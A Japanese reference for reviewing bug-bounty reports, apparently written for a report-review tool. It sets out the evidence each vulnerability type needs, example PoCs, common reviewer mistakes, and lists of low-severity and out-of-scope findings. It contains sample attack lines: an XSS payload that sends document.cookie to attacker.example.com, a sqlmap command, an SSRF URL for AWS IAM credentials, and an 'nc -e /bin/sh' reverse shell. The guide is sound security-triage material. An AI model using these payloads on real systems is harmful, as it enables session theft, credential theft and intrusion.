# 脆弱性タイプ別の必須要素・PoC 例・典型 NG

レビュー時に「このタイプ固有の」評価軸を 13 観点に追加するためのリファレンス。

末尾に **「デフォルト Low 扱いの脆弱性」** と **「典型的な Out-of-Scope」** リストを置いている。報告蓋然性 / 状態予測の判定で必ず参照する。

---

## XSS (Cross-Site Scripting)

### 必須要素
- 脆弱な **シンク**（HTML / 属性 / JS / URL / CSS のどこか）の特定
- 脆弱な **ソース**（GET/POST/Cookie/Header/DOM のどこか）の特定
- 反射型 / 蓄積型 / DOM ベースの区別
- 動作する PoC ペイロード
- セッション / トークン窃取 / オリジン乗っ取りまでの **影響パス**

### PoC ペイロード（実害なし版）
- ❌ `<script>alert(1)</script>` だけ（Intigriti が NG 明示）
- ✅ `<script>fetch('https://attacker.example.com/?c='+btoa(document.cookie))</script>`
- ✅ `<img src=x onerror="document.body.innerText=document.domain+' '+document.cookie">`
- ✅ Cookie が `HttpOnly` の場合：`localStorage` / `sessionStorage` / CSRF トークン窃取 / 任意 API 呼び出しを示す

### 典型 NG パターン
- 自己 XSS なのに「Critical」主張（自分のページにしかペイロード入らない）
- CSP で実行が阻止される環境で「実行できる」と誤主張
- WAF で弾かれるペイロードを「動く」と書く（再現失敗で却下）
- ブラウザ依存（IE / 古い Safari でしか動かない）の明記なし

### Quick Fix の出し方
```markdown
**Sink**: `<div class="title">{name}</div>` (HTML body context)
**Source**: GET parameter `name` on `/search`
**Type**: Reflected XSS
**Cookie HttpOnly?**: Yes (so cookie theft path is via XHR using session cookies)
**CSP**: `default-src 'self'` — but `unsafe-inline` allowed for scripts → bypass possible
**Exploitation chain**:
  1. Victim clicks attacker link
  2. Payload fetches `/api/v2/users/me` with victim's session
  3. Response (containing email + API token) sent to attacker server
  4. Attacker uses API token for full account access
```

---

## SQL Injection

### 必須要素
- 脆弱なパラメータの特定
- インジェクションタイプ（Error / Union / Boolean / Time-based / Stacked）
- データベース種別（MySQL / Postgres / MSSQL / Oracle）の特定
- 抽出可能なデータの証拠（DB 名、バージョン、テーブル名など、**実データではなくメタ情報**）
- 認証必要性、権限レベル

### PoC
- ✅ 動作する手動ペイロード（最低 1 つ）
- ✅ `sqlmap` 使用時はフルコマンド：`sqlmap -r request.txt --batch --level 5 --risk 3 --dbs`
- ✅ レスポンスの抜粋（DB バージョンやテーブル名が見える行）
- ❌ 実顧客データの抽出（規約違反・倫理問題）

### 典型 NG
- `' OR 1=1--` だけで「SQLi です」（エラー or 動作証拠なし）
- ペイロードがアプリ側のロジックエラーで例外を出しているだけ（SQL 実行されてない）
- WAF / Prepared Statement の有無を確認していない

### CVSS の論点
- 認証なし + データ抽出可 → 7.5 (High)
- 書き込み可 / DBA 権限 → 9.8 (Critical)
- 認証必要 / 限定的なテーブルのみ → 5-6 (Medium)

---

## IDOR (Insecure Direct Object Reference)

### 必須要素
- 脆弱なエンドポイントとオブジェクト ID パラメータ
- ID の種類（連番 / UUID / 短いハッシュ）
- **2 つのアカウント**を使った PoC（攻撃者 vs 被害者）
- 被害者リソースの「正常にはアクセスできないはず」の確認
- 影響：読み取りのみ / 改ざん可能 / 削除可能のいずれか

### PoC 構造（必須）
1. 攻撃者アカウント A でログイン
2. 攻撃者の正常なリクエストとレスポンス
3. ID を被害者アカウント B のものに変更
4. レスポンスが被害者のデータを返している（または被害者の状態が変わっている）証拠
5. 被害者アカウント B でログインして変更/閲覧の証拠

### 典型 NG
- アカウント 1 つしか使っていない（権限境界の証明にならない）
- 「ID を変えたら 200 が返る」だけで、レスポンスボディが他人のものか不明
- 自分の管理者アカウントで一般ユーザーのデータを読んだだけ（IDOR ではなく仕様）
- パブリックリソースを「IDOR」と誤報告

### CVSS の論点
- 連番 ID → AC:L、UUID → AC:H
- 全データ漏洩 → C:H、特定属性のみ → C:L
- マルチテナント越境 → S:C

---

## SSRF (Server-Side Request Forgery)

### 必須要素
- 脆弱なエンドポイント（URL を受け取る箇所）
- リダイレクト / DNS リバインディング等の制限回避手法（必要なら）
- Full Response か Blind かの明示
- 内部到達先（メタデータエンドポイント、内部 API、ローカルホスト）
- AWS/GCP/Azure メタデータが取れた場合は **IAM 権限の特定**

### PoC
- ✅ Full：`?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- ✅ Blind：Burp Collaborator / Interactsh のコールバック画面（タイムスタンプ含む）
- ❌ Blind なのに「Critical」主張で内部到達点が不明

### 典型 NG
- 自社のドメインに対するリクエストだけで「SSRF」と主張
- DNS 解決のみ確認できて、HTTP レスポンスを取得できていない
- AWS メタデータが取れたが、IMDSv2 の場合トークン取得手順が抜けている

### CVSS の論点
- Full + クラウド境界越え → S:C / Critical
- Blind + 内部スキャンのみ → Medium

---

## RCE (Remote Code Execution)

### 必須要素
- 脆弱な機能・ライブラリの特定
- 実行コマンドと出力の証拠
- 認証要件、権限要件
- **安全な PoC**：`id`、`whoami`、`hostname`、DNS コールバック程度に留める
- リバースシェル取得、永続化、データ抽出は **絶対にやらない**

### 典型 NG
- `nc -e /bin/sh attacker:4444` などのリバースシェル PoC（多くのプログラムで規約違反）
- 実本番サーバで `rm` / `chmod` / 永続化スクリプト
- 「RCE っぽい挙動」だけで実際にコマンド実行の証拠なし

### CVSS の論点
- 認証なし → 9.8 Critical
- コンテナ脱出 / 横展開 → S:C で 10.0

---

## CSRF

### 必須要素
- 状態変更を伴うエンドポイントであること
- CSRF トークン / SameSite Cookie / Origin/Referer 検証の不備
- 動作する HTML PoC
- 影響：何が変更可能か（メアド変更 → アカウント乗っ取りまでチェーン化が望ましい）

### 典型 NG
- GET でリダイレクトするだけのエンドポイント（多くのプログラムで OOS）
- `SameSite=Lax` 環境で動作しないペイロードを「動く」と書く
- ログアウト CSRF（多くのプログラムで OOS）

---

## Authentication / Authorization Bypass

### 必須要素
- バイパス手法の詳細（パラメータ改ざん、JWT 改ざん、ヘッダ改ざん、状態管理欠陥）
- 通常のフロー vs バイパスフローの差分
- 取得可能になる権限の範囲

### 典型 NG
- 「`is_admin=true` を JSON に入れたら通った」だけで、**何ができるようになったか**が不明
- JWT のアルゴリズム混乱攻撃で `none` アルゴリズム成功と書いているが、実際はサーバが拒否

---

## Open Redirect

### 必須要素
- 脆弱なパラメータ
- バリデーション回避手法（`//`、`\\`、`@`、URL エンコード等）
- フィッシング以外の影響（OAuth トークン窃取、SSRF へのチェーン）

### 典型 NG
- 純粋な Open Redirect 単体（多くのプログラムで Low / Informative）
- 同一ドメイン内でのリダイレクトを「Open Redirect」と誤報告

---

## Information Disclosure

### 必須要素
- 漏洩している情報の **具体的な種類**
- 機微度の評価（PII / 認証情報 / 内部構成 / バージョン情報）
- アクセス可能性（公開 / 認証必要 / 内部のみ）
- 情報の用途（攻撃に直結 / 偵察にしか使えない）

### 典型 NG
- バージョン情報の開示だけ → 多くのプログラムで Informative
- `.git/HEAD` がアクセス可能だが `.git/objects/` は 403 で実害証明なし
- スタックトレースの開示 → コンテキストなしでは Low

---

## ビジネスロジック / Race Condition

### 必須要素
- 正常な動作フロー
- 異常を引き起こす操作シーケンス（タイミング、並列性）
- ビジネス的損害（金銭、特典の二重取得、ユーザー間の権限混線等）

### 典型 NG
- 「2 回押したら 2 回処理された」だけで、ビジネス影響不明
- 並列リクエストが「予期せぬエラー」を返すだけで攻撃にならない

---

## モバイル特有

### Android
- ExportedActivity / ContentProvider / IntentFilter の脆弱な公開
- WebView の `loadUrl` / `addJavascriptInterface`
- Deeplink ハイジャック

### iOS
- URL Scheme ハイジャック
- Keychain / UserDefaults の機微情報保存
- Certificate Pinning バイパス（プログラムが対象とする場合）

### 必須要素
- 端末状態（ROOT / Jailbreak / 通常）の明記
- アプリバージョンと取得元（公式ストア vs サイドロード）

---

## API / GraphQL 特有

### 必須要素
- スキーマ情報（`/__graphql` / Introspection）
- レート制限、バッチクエリの状況
- Query / Mutation 名と引数

### GraphQL 固有 NG
- Introspection 開示だけ → 多くのプログラムで Informative
- Batch Query を送れるだけで実害がない

---

## 付録 A：デフォルト Low / Informative 扱いの脆弱性（Intigriti v1.3 + 業界共通）

以下は単体では多くのプログラムで **Low / Informative** 判定される。報告蓋然性が下がるため、報告するなら**チェーン化や具体的な悪用シナリオ**を提示する：

### 単独では Low 確実
- 外部サイトへの単純な Open Redirect（フィッシング以外の悪用がない場合）
- デバッグ情報の開示（スタックトレース、エラーメッセージのみ）
- バージョン情報の開示（HTTP ヘッダ、エラーメッセージ）
- HTTP セキュリティヘッダの欠如のみ（X-Frame-Options、CSP、HSTS など）
- Cookie に Secure / HttpOnly フラグが無いだけ（盗難証明なし）
- クリックジャッキング（非機微ページ）

### 単独では Informative の典型
- 削除後のリソース残存（実害証明なし）
- 認証なしでアクセス可能だが機密性のない情報
- 仕様レベルの「許容されるリスク」（パスワードポリシーが緩い等）
- 機能的バグだが「セキュリティ脅威を直ちに構成しない」もの（Intigriti 公式定義）
- 不正なスコープの Cookie だが盗難証明がない

### 「チェーン化で Medium/High に上げられる」例
- Open Redirect → OAuth トークン窃取 → アカウント乗っ取り
- バージョン開示 → 既知 CVE の手動再現 → 該当 CVE の Severity
- Click-jacking → 認証フロー操作 → アカウント奪取
- HTTP セキュリティヘッダ欠如 → 既存 XSS と組み合わせて Cookie 窃取

レビュー時、これらに該当するレポートを見たら：
- 「単体では Informative になる可能性が高い。具体的悪用シナリオを構築するか、報告自体を見送ることを推奨」と伝える
- チェーン化の余地があれば、その方向で再構築を促す

---

## 付録 B：典型的な Out-of-Scope（業界共通）

プログラム規約に明示されることが多い OOS 脆弱性タイプ。ユーザーが提出しようとしているものがこれに該当する場合、**観点 1 を低スコアにし、状態予測を OOS とする**：

### 攻撃手法系 OOS
- DDoS / DoS（明示許可なき限り）
- ブルートフォース攻撃（Rate Limit Bypass の単独報告）
- ソーシャルエンジニアリング（ベンダー / 顧客 / 従業員）
- 物理攻撃
- 第三者リークデータの利用（Intigriti 明示禁止）

### 脆弱性タイプ系 OOS
- Self-XSS（ほぼ全プログラムで OOS）
- Logout CSRF
- Email enumeration（多くのプログラムで OOS）
- 開発・ステージング環境（Pre-prod）
- マーケティングサイトのみの脆弱性（プログラムが本番アプリ対象の場合）
- 期限切れ証明書、SSL Lab Score 低下のみ
- メール SPF / DMARC レコードの欠如のみ
- HTTP Public Key Pinning（HPKP）非実装
- 古い TLS バージョンの許容
- Banner/Version Disclosure のみ
- Missing CAA Record
- Missing Cookie flags のみ（実害証明なし）
- 公開ドキュメント / マーケティング ページの Open Redirect

### 対象系 OOS
- サードパーティ SaaS（SendGrid、Zendesk、Intercom、Auth0、Stripe 等）への報告
- CDN / Cloud プロバイダ（Cloudflare、AWS、GCP）の問題でブランド側に責任が無いもの
- 本番の Subdomain Takeover で「現在所有していないサブドメイン」（廃止予定の場合 OOS）
- 過去に既知（Disclosed）の CVE への単純報告

### Bugcrowd VRT
Bugcrowd は [Vulnerability Rating Taxonomy (VRT)](https://bugcrowd.com/vulnerability-rating-taxonomy) を公開しており、JSON 形式で全カテゴリと P1〜P5 の優先度がメンテナンスされている（v1.18 時点）。レビュー時、Bugcrowd プログラム向けレポートでは VRT カテゴリ名の記載を推奨する。

---

## 付録 C：状態予測との関連

vuln-types を読んでから状態予測する：

| 検出した脆弱性タイプ | 推定される状態 |
|---|---|
| 付録 A の Default Low に該当 + チェーン化なし | **Informative（70%）** |
| 付録 B の OOS に該当 | **OOS（80%）** |
| 高品質な Stored XSS / IDOR / SQLi / RCE | **Accepted（60-80%）** |
| 古いライブラリ既知 CVE の単純報告 | **Duplicate or N/A（50%）** |
| 自己 XSS / Logout CSRF | **OOS or Informative（85%）** |
